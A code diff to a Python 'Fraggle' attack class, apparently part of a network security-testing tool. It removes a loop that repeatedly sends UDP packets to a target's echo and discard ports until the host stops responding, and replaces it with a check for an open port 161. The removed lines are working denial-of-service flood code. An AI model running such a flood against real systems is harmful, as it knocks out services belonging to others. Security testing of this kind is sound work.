@@ -24,25 +24,10 @@ class Fraggle(GenericAttack):
             return {"status": "no_open_ports"}
 
         openPorts = self.device["vulnerable_ports"]["udp"]["open"]
-        if 7 not in openPorts and 9 not in openPorts:
-            return {"status": "no_open_ports"}
+        if 161 in openPorts:
+            return {"status": "vulnerable to ssnp"}
 
-        while self.running:
-            if 7 in openPorts:
-                ip_hdr = IP(dst=target)
-                packet = ip_hdr / UDP(dport=7)
-                send(packet)
-
-            if 9 in openPorts:
-                ip_hdr = IP(dst=target)
-                packet = ip_hdr / UDP(dport=9)
-                send(packet)
-
-            if not self.is_alive():
-                log.info('Host not responding!')
-                return {"status": "not_responding"}
-
-        return {"status": "responding"}
+        return {"status": "no_open_ports"}
 
     def is_alive(self):
         """Check if the target is alive"""
